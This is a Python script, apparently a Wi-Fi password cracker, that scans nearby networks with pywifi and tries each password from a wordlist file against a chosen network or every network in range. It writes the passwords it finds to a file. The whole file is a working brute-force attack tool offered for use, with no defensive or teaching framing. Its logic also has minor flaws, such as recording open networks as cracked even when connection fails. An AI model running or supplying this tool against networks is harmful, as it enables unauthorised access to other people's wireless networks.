import time
import pywifi
from pywifi import const

available_devices = []
keys = []
final_output = {}

wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]

print(interface.name())

interface.scan()
time.sleep(5)

scan_results = interface.scan_results()
print(type(scan_results))

available_devices = [(result.ssid, result.bssid) for result in scan_results]

for ssid, mac_address in available_devices:
    print("{:<20} => {:}".format("SSID", ssid))
    print("{:<20} => {:}".format("MAC Address", mac_address))
    print()

selected_ssid = input("Enter the SSID of the network you want to crack (or enter 'CRACKALL' to crack all): ")

if selected_ssid == "CRACKALL":
    selected_ssid = None

with open('pass.txt', 'r') as f:
    keys = [line.strip() for line in f if line.strip() not in keys]

for ssid, mac_address in available_devices:
    if selected_ssid is None or ssid == selected_ssid:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_NONE)
        iface = wifi.interfaces()[0]
        iface.remove_all_network_profiles()
        profile = iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(4)
        if iface.status() == const.IFACE_CONNECTED:
            print('Success! Password of the network', ssid, 'is "none"')
            final_output[ssid] = ""
        else:
            print('Failed to connect to the network', ssid)

        if selected_ssid is None:
            with open('cracked-passwords.txt', 'a') as f:
                f.write("SSID: {}\nPassword: 'none'\n\n".format(ssid))

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        flag = 0
        for key in keys:
            profile.key = key
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)
            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print('Success! Password of the network', ssid, 'is', key)
                final_output[ssid] = key
                flag = 1

                if selected_ssid is None:
                    with open('cracked-passwords.txt', 'a') as f:
                        f.write("SSID: {}\nPassword: {}\n\n".format(ssid, key))

                break
            else:
                print('Trying password:', key)

        if flag == 0:
            print('Failed to crack the password of the network', ssid)

print("\n" + '*' * 10, 'Discovered Password', '*' * 10)
print("{0:<12} {1:<}".format("SSID", "PASSWORD"))
for ssid, key in final_output.items():
    print("{:<12}|{:<12}".format(ssid, key))
